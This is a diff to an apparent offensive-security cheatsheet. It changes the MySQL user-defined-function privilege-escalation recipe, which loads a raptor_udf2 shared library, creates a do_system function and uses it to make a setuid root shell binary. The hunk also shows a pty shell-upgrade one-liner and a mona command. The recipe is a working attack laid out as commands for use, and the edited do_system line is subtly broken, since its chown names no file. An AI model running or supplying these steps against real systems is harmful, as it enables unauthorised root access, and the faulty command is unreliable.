@@ -277,13 +277,14 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 !mona modules
 ```
 ##### MySQL User Defined Fuction Privilge Escalation
+Requires [raptor_udf2.c](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/raptor_udf2.c) and [sid-shell.c](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/sid-shell.c)
 ```mysql
 use mysql;
 create table npn(line blob);
-insert into npn values(load_file('/home/npn/raptor_udf2.so'));
+insert into npn values(load_file('/tmp/raptor_udf2.so'));
 select * from npn into dumpfile '/usr/lib/raptor_udf2.so';
 create function do_system returns integer soname 'raptor_udf2.so';
-select do_system('id > /tmp/out; chown npn:npn /tmp/out');
+select do_system('chown root:root; chmod +s /tmp/sid-shell');
 ```
 
 ##### Finding JMP ESP Address
